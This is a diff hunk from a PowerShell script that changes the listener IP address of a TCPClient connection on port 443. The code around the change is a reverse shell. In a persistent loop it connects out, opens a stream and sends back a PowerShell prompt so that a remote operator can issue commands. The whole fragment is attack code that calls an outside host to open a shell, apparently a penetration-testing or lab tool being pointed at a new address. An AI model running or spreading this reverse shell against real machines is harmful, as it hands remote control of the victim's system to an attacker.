@@ -4,7 +4,7 @@ while (1 -eq 1)
     try
     {
         #attempt inital connection
-        $client = New-Object System.Net.Sockets.TCPClient("192.168.1.96",443);
+        $client = New-Object System.Net.Sockets.TCPClient("192.168.219.129",443);
         $stream = $client.GetStream();
         [byte[]]$bytes = 0..255|%{0};
         $sendbytes = ([text.encoding]::ASCII).GetBytes("Client Connected..."+"`n`n" + "PS " + (pwd).Path + "> ");
